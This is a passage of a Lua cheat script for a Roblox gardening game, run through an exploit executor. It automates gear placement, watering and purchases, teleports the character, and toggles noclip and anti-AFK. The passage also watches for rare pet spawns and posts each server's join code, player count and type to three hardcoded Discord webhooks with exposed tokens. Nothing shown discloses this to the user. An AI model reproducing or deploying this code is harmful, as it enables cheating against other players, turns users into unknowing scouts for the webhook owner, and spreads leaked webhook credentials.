    Callback = function(val)
        GearSelectionMode = val
        if val then
            Notification.new({Title="Gear Point", Content="Click anywhere to place a point.", Duration=4})
        end
    end
})

GearSection:AddLabel("Gear to Assign"):AddDropdown({
    Default = "Common Sprinkler",
    Values = GearNames,
    Flag = "assign_gear",
    Callback = function(val) Toggles.assign_gear = val end
})

GearSection:AddLabel("Cans"):AddSlider({
    Default = Toggles.WateringAmount or 1, Min = 1, Max = 5, Flag = "WateringAmount",
    Callback = function(val) Toggles.WateringAmount = val; SaveGearZones() end
})

GearSection:AddLabel("Delay"):AddSlider({
    Default = Toggles.WateringInterval or 5, Min = 2, Max = 15, Flag = "WateringInterval",
    Callback = function(val) Toggles.WateringInterval = val; SaveGearZones() end
})

GearSection:AddButton({
    Name = "Clear All Gear Zones",
    Callback = function()
        for _, zone in ipairs(GearZones) do
            if zone.Part then zone.Part:Destroy() end
        end
        table.clear(GearZones)
        if tempGearSelectionMarker then tempGearSelectionMarker:Destroy() tempGearSelectionMarker = nil end
        GearSelectionStep = GearSelectionMode and 1 or 0
        SaveGearZones()
        Notification.new({Title="Cleared", Content="All Gear zones cleared.", Duration=2})
    end
})

GearSection:AddLabel("Auto Gear/Water"):AddToggle({
    Default = false,
    Flag = "AutoPlaceGears",
    Callback = function(val) Toggles.AutoPlaceGears = val end
})

local CurrentCamera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if GearSelectionMode and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        local mousePos = UserInputService:GetMouseLocation()
        local ray = CurrentCamera:ViewportPointToRay(mousePos.X, mousePos.Y)

        local raycastParams = RaycastParams.new()
        raycastParams.FilterType = Enum.RaycastFilterType.Include
        raycastParams.FilterDescendantsInstances = CollectionService:GetTagged("PlantArea")

        local hit = workspace:Raycast(ray.Origin, ray.Direction * 5000, raycastParams)
        if hit and hit.Instance then
            local hitPos = hit.Position

            local zonePart = Instance.new("Part")
            zonePart.Anchored = true
            zonePart.CanCollide = false
            zonePart.Size = Vector3.new(1.5, 0.2, 1.5)
            zonePart.CFrame = CFrame.new(hitPos)
            zonePart.Color = Color3.new(0, 1, 1)
            zonePart.Material = Enum.Material.ForceField
            zonePart.Transparency = 0.5
            zonePart.Parent = workspace

            local plotCFrame = GetPlayerPlotCFrame()
            local relCF = nil
            if plotCFrame then
                relCF = plotCFrame:ToObjectSpace(zonePart.CFrame)
            end

            table.insert(GearZones, {
                Part = zonePart,
                Gear = Toggles.assign_gear,
                RelCFrame = relCF
            })
            SaveGearZones()

            Notification.new({Title="Gear Point Set", Content="Point saved for: " .. tostring(Toggles.assign_gear), Duration=3})
        end
    end
end)

local SprinklerRadiuses = {
    ["Common Sprinkler"] = 12,
    ["Uncommon Sprinkler"] = 16,
    ["Rare Sprinkler"] = 22,
    ["Legendary Sprinkler"] = 30,
    ["Super Sprinkler"] = 40
}

local function AttemptUseGear(targetPos, gearName, clicks)
    local char = Players.LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local backpack = Players.LocalPlayer:FindFirstChild("Backpack")
    local tool = char:FindFirstChild(gearName) or (backpack and backpack:FindFirstChild(gearName))

    if not tool then
        if backpack then
            for _, obj in ipairs(backpack:GetChildren()) do
                if string.find(string.lower(obj.Name), string.lower(gearName)) then
                    tool = obj
                    break
                end
            end
        end
    end

    if not tool and Toggles.AutoBuyGears then
        pcall(function() Networking.GearShop.PurchaseGear:Fire(gearName) end)
        task.wait(0.5)
        tool = char:FindFirstChild(gearName) or (backpack and backpack:FindFirstChild(gearName))
        if not tool and backpack then
            for _, obj in ipairs(backpack:GetChildren()) do
                if string.find(string.lower(obj.Name), string.lower(gearName)) then
                    tool = obj
                    break
                end
            end
        end
    end

    if tool then
        if tool.Parent ~= char then
            humanoid:EquipTool(tool)
            local t = 0
            while tool.Parent ~= char and t < 1 do
                task.wait(0.05)
                t = t + 0.05
            end
            task.wait(0.1)
        end

        if targetPos then
            local net = require(game:GetService("ReplicatedStorage"):WaitForChild("SharedModules"):WaitForChild("Networking"))
            local lName = string.lower(gearName)
            local plotId = Players.LocalPlayer:GetAttribute("PlotId") or 1

            if lName:find("watering can") then
                pcall(function()
                    local hasFruit = false
                    for _, obj in ipairs(workspace:GetDescendants()) do
                        if obj:IsA("Model") and obj:GetAttribute("FruitId") then
                            if (obj:GetPivot().Position - targetPos).Magnitude < 4 then
                                hasFruit = true
                                break
                            end
                        end
                    end

                    if hasFruit then return end

                    local root = char:FindFirstChild("HumanoidRootPart")
                    local origCF = nil
                    local platform = nil

                    if root then
                        origCF = root.CFrame

                        platform = Instance.new("Part")
                        platform.Size = Vector3.new(5, 1, 5)
                        platform.Anchored = true
                        platform.CanCollide = true
                        platform.Transparency = 1
                        platform.Position = targetPos + Vector3.new(0, 10, 0)
                        platform.Parent = workspace

                        root.CFrame = CFrame.new(platform.Position + Vector3.new(0, 3, 0), targetPos)
                        root.Velocity = Vector3.zero

                        task.wait(0.5)
                    end

                    for i = 1, clicks do
                        net.WateringCan.UseWateringCan:Fire(targetPos, gearName, tool)
                        task.wait(0.3)
                    end

                    task.wait(0.4)

                    if platform then
                        platform:Destroy()
                    end

                    if root and origCF then
                        root.CFrame = origCF
                        root.Velocity = Vector3.zero
                    end
                end)
            else
                for i = 1, clicks do
                    if lName:find("sprinkler") then
                        pcall(function() net.Place.PlaceSprinkler:Fire(targetPos, gearName, tool, plotId) end)
                    elseif lName:find("gnome") then
                        pcall(function() net.Place.PlaceGnome:Fire(targetPos, gearName, tool) end)
                    elseif lName:find("raccoon") then
                        pcall(function() net.Place.PlaceRaccoon:Fire(targetPos, gearName, tool) end)
                    elseif lName:find("ladder") then
                        pcall(function() net.Place.PlaceLadder:Fire(targetPos, gearName, tool) end)
                    elseif lName:find("rake") then
                        pcall(function() net.Place.PlaceRake:Fire(targetPos, gearName, tool, plotId, 0) end)
                    elseif lName:find("bird") then
                        pcall(function() net.Place.PlaceBird:Fire(targetPos, gearName, tool) end)
                    else
                        pcall(function() net.Place.PlaceProp:Fire(targetPos, gearName, tool, 0) end)
                    end
                    task.wait(0.1)
                end
            end
        end
    end
end

local function AutoPlaceGearsLogic()
    local lastWatering = 0
    while _G.GAG2_Running do
        task.wait(1)
        if Toggles.AutoPlaceGears then
            pcall(function()
                local char = Players.LocalPlayer.Character
                local rootPart = char and char:FindFirstChild("HumanoidRootPart")
                if not rootPart then return end

                for _, zone in ipairs(GearZones) do
                    if not zone.Part then continue end
                    local gear = zone.Gear

                    if string.find(string.lower(gear), "watering can") then
                        if os.time() - lastWatering >= Toggles.WateringInterval then
                            lastWatering = os.time()
                            AttemptUseGear(zone.Part.Position, gear, Toggles.WateringAmount)
                        end
                    elseif string.find(string.lower(gear), "sprinkler") then
                        zone.LastSprinklerTime = zone.LastSprinklerTime or 0
                        if os.time() - zone.LastSprinklerTime >= 121 then
                            AttemptUseGear(zone.Part.Position, gear, 1)
                            zone.LastSprinklerTime = os.time()
                            task.wait(1)
                        end
                    else
                        AttemptUseGear(zone.Part.Position, gear, 1)
                        task.wait(1)
                    end
                end
            end)
        end
    end
end
task.spawn(AutoPlaceGearsLogic)

local MenuGroup = window.UserSettings

if MenuGroup then
    MenuGroup:AddLabel("Menu Scale"):AddDropdown({
        Default  = "Default",
        Values   = { "Small", "Mobile", "Default", "Large" },
        Callback = function(v)
            if window and KevinHub.Scales and KevinHub.Scales[v] then
                pcall(function() window:SetSize(KevinHub.Scales[v]) end)
            end
        end,
    })

    MenuGroup:AddLabel(_detectExecutor())

    MenuGroup:AddButton({
        Name     = "Unload",
        Callback = function()
            KevinHub.UnloadEnabled = true
            pcall(function() KevinHub:Unload() end)

            if KevinHub.ScreenGui then
                pcall(function() KevinHub.ScreenGui:Destroy() end)
            end

            for _, zone in ipairs(PlantZones) do
                if zone.Part then zone.Part:Destroy() end
            end
            if TempSelectionMarker then TempSelectionMarker:Destroy() end

            for _, zone in ipairs(GearZones) do
                if zone.Part then zone.Part:Destroy() end
            end
            if tempGearSelectionMarker then tempGearSelectionMarker:Destroy() end

            Toggles.AutoBuy = false
            Toggles.AutoPlant = false
            Toggles.AutoHarvest = false
            Toggles.AutoSell = false
            Toggles.AutoDropFruits = false
            Toggles.AutoBuyGears = false
            Toggles.AntiAFK = false
            Toggles.AutoCollectSeeds = false
            Toggles.SpamSkillPoints = false
            Toggles.AutoPlaceGears = false
            Toggles.AutoTamePets = false
            Toggles.AutoAcceptTrades = false
            Toggles.NoclipEnabled = false
            _G.GAG2_Running = false
        end
    })
end

task.spawn(function()
    local function GetPetName(instance)
        local pName = instance.Name
        local currNode = instance
        while currNode and currNode ~= workspace do
            if currNode:GetAttribute("PetName") then
                pName = currNode:GetAttribute("PetName")
                break
            end
            if currNode:IsA("Model") and currNode.Name ~= "Workspace" then
                pName = currNode.Name
            end
            currNode = currNode.Parent
        end
        for _, known in ipairs(PetNames) do
            if string.find(string.lower(tostring(pName)), string.lower(known)) then
                return known
            end
        end
        return nil
    end

    local function CountCurrentPets()
        local counts = {}
        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                local action = string.lower(prompt.ActionText or "")
                if action:find("tame") or action:find("приручить") or action:find("buy") then
                    local pName = GetPetName(prompt.Parent)
                    if pName then
                        counts[pName] = (counts[pName] or 0) + 1
                    end
                end
            end
        end
        return counts
    end

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local GearImages = ReplicatedStorage:WaitForChild("SharedModules", 5)
    if GearImages then GearImages = GearImages:WaitForChild("GearImages", 5) end

    local function GetPetIconUrl(pName)
        if GearImages then
            local val = GearImages:FindFirstChild(pName)
            if val and val:IsA("StringValue") and val.Value ~= "" then
                local id = val.Value:match("%d+")
                if id then
                    local req = request or (syn and syn.request) or (http and http.request) or http_request
                    if req then
                        local success, result = pcall(function()
                            return req({
                                Url = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. tostring(id) .. "&returnPolicy=PlaceHolder&size=420x420&format=Png",
                                Method = "GET"
                            })
                        end)
                        if success and result and result.Body then
                            local s, decoded = pcall(function() return HttpService:JSONDecode(result.Body) end)
                            if s and decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
                                return decoded.data[1].imageUrl
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local serverType = "Public Server"

    local rs = game:GetService("ReplicatedStorage")
    local envModule = rs:FindFirstChild("SharedModules") and rs.SharedModules:FindFirstChild("Environment")

    if envModule and envModule:GetAttribute("serverType") then
        local sType = envModule:GetAttribute("serverType")
        if sType == "Private" then
            serverType = "VIP Server"
        elseif sType == "Reserved" then
            serverType = "Reserved Server"
        end
    else
        local pId = game.PrivateServerId
        local pOwner = game.PrivateServerOwnerId
        if pId and pId ~= "" then
            serverType = "VIP/Reserved Server"
        elseif pOwner and pOwner ~= 0 then
            serverType = "VIP Server"
        elseif game.VIPServerId and game.VIPServerId ~= "" then
            serverType = "VIP Server"
        elseif game.VIPServerOwnerId and game.VIPServerOwnerId ~= 0 then
            serverType = "VIP Server"
        end
    end

    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "', game.Players.LocalPlayer)"

    local notifiedPets = {}
    for _, prompt in ipairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") then
            local pName = GetPetName(prompt.Parent)
            if pName then notifiedPets[prompt.Parent] = true end
        end
    end

    workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("ProximityPrompt") then
            task.wait(0.5)
            local action = string.lower(descendant.ActionText or "")
            if action:find("tame") or action:find("приручить") or action:find("buy") then
                local pName = GetPetName(descendant.Parent)
                if pName and not notifiedPets[descendant.Parent] then
                    notifiedPets[descendant.Parent] = true
                    local data = PetData[pName]
                    if data then
                        local rarity = data.Rarity
                        local webhookUrl = nil
                        if rarity == "Legendary" then
                            webhookUrl = "https://discord.com/api/webhooks/1518506070434250812/Hr2cT42ReXtMXoLumPNFMxFsRaZkku2dTKn33ySRtere1cpuqF1q21CVJIS9nec_rrdL"
                        elseif rarity == "Mythic" then
                            webhookUrl = "https://discord.com/api/webhooks/1518506222771503136/RbH9vYscSDEweiKfPUI5tqrVgU-399MbWDYaFW2pwbD9GW8HH-XOzr8x5we6oKgkBSc0"
                        elseif rarity == "Super" then
                            webhookUrl = "https://discord.com/api/webhooks/1518506329218482246/bKaKBHJG4B8gBs56NtDgWMijZoFfsSmdEVkRlKUvRo684hykI3uQ-C02GNYDFIuQNkSP"
                        end

                        if webhookUrl then
                            local function GetDespawnTime(petInstance)
                                for _, child in ipairs(petInstance:GetDescendants()) do
                                    if child:IsA("TextLabel") and child.Text then
                                        local rawText = string.gsub(child.Text, "<[^>]+>", "")
                                        if string.match(rawText, "%d+m %d+s") or string.match(rawText, "^%d+s$") or string.match(rawText, "^%d+m$") then
                                            return rawText
                                        end
                                    end
                                end
                                local d = petInstance:GetAttribute("UnixDespawn") or petInstance:GetAttribute("DespawnTime")
                                if not d then
                                    local c = petInstance:FindFirstChild("UnixDespawn") or petInstance:FindFirstChild("DespawnTime")
                                    if c and (c:IsA("IntValue") or c:IsA("NumberValue")) then d = c.Value end
                                end
                                if d and type(d) == "number" then
                                    local rem = d > 1e9 and (d - os.time()) or d
                                    rem = math.max(0, rem)
                                    return string.format("%02d:%02d", math.floor(rem/60), math.floor(rem%60))
                                end
                                return "Unknown"
                            end

                            local despawnStr = GetDespawnTime(descendant.Parent)

                            local playerCount = tostring(#game:GetService("Players"):GetPlayers()) .. " / " .. tostring(game:GetService("Players").MaxPlayers)

                            local alertEmbed = {
                                title = "ОООО ЧОТ ПОЯВИЛОСЬ!! [" .. rarity .. "] " .. pName,
                                description = "**" .. pName .. "** только что заспавнился!\n\n**Players:** " .. playerCount .. "\n**Despawns In:** " .. despawnStr .. "\n**Server:** " .. serverType .. "\n**Join Code:**\n```lua\n" .. joinScript .. "\n```",
                                color = 16711680,
                                timestamp = DateTime.now():ToIsoDate()
                            }
                            local iconUrl = GetPetIconUrl(pName)
                            if iconUrl then
                                alertEmbed.thumbnail = { url = iconUrl }
                            end
                            SendDiscordWebhook({alertEmbed}, webhookUrl)
                        end
                    end
                end
            end
        end
    end)
end)

task.spawn(function()
    local function formatTime(seconds)
        local h = math.floor(seconds / 3600)
        local m = math.floor((seconds % 3600) / 60)
        local s = seconds % 60
        if h > 0 then
            return string.format("%02d:%02d:%02d", h, m, s)
        else
            return string.format("%02d:%02d", m, s)
        end
    end

    local function getMoonForCycle(cycleCount)
        local seed = (cycleCount * 1000) + 3
        local rng = Random.new(seed)
        local roll = rng:NextInteger(1, 100)
        local sum = 0
        local weathers = {
            {Name = "Bloodmoon", Chance = 2},
            {Name = "Rainbow Moon", Chance = 6},
            {Name = "Goldmoon", Chance = 13},
            {Name = "Moon", Chance = 79}
        }
        for _, w in ipairs(weathers) do
            sum = sum + w.Chance
            if roll <= sum then return w.Name end
        end
        return "Moon"
    end

    while true do
        task.wait(1)
        if not NextEventLabel then continue end
        local t = math.floor(os.time())
        local cycleCount = math.floor(t / 600)
        local cycleTime = t % 600

        local currentMoon = getMoonForCycle(cycleCount)
        if cycleTime >= 480 and currentMoon ~= "Moon" then
            local timeRemaining = 600 - cycleTime
            NextEventLabel:SetText("Active: " .. currentMoon .. " (" .. formatTime(timeRemaining) .. " left)")
        else
            local specialMoon = "None"
            local cyclesAway = 0
            local startOffset = (cycleTime < 480) and 0 or 1

            for i = startOffset, 30 do
                local moon = getMoonForCycle(cycleCount + i)
                if moon ~= "Moon" then
                    specialMoon = moon
                    cyclesAway = i
                    break
                end
            end

            if specialMoon ~= "None" then
                local timeRemaining = 0
                if cyclesAway == 0 then
                    timeRemaining = 480 - cycleTime
                else
                    timeRemaining = (600 - cycleTime) + 480 + ((cyclesAway - 1) * 600)
                end
                NextEventLabel:SetText("Next: " .. specialMoon .. " (in " .. formatTime(timeRemaining) .. ")")
            else
                NextEventLabel:SetText("Next Event: Nothing soon")
            end
        end
    end
end)

task.spawn(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local s, PlayerStateClient = pcall(function() return require(ReplicatedStorage:WaitForChild("ClientModules", 10):WaitForChild("PlayerStateClient", 10)) end)
    local FruitValueCalc = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("FruitValueCalc"))

    if not s or not PlayerStateClient or not FruitValueCalc then
        if InventoryValueLabel then
            InventoryValueLabel:SetText("Inventory Value: Error Loading Modules")
        end
        return
    end

    if getgenv and getgenv()._GAG2_ValueGui then
        pcall(function() getgenv()._GAG2_ValueGui:Destroy() end)
        getgenv()._GAG2_ValueGui = nil
    end

    local lastCalcTick = 0
    while _G.GAG2_Running and task.wait(1) do
        pcall(function()
            if not InventoryValueLabel then return end

            if tick() - lastCalcTick >= 3 then
                lastCalcTick = tick()

                local pcallSuccess, serverVal = pcall(function()
                    return Networking.NPCS.PreviewSellAll:Fire()
                end)

                if pcallSuccess and serverVal and type(serverVal.TotalValue) == "number" then
                    local totalValue = serverVal.TotalValue
                    if totalValue > 0 then
                        local formatted = tostring(math.floor(totalValue)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                        InventoryValueLabel:SetText("Inventory Value: $" .. formatted)
                    else
                        InventoryValueLabel:SetText("Inventory Value: $0")
                    end
                end
            end
        end)
    end
end)
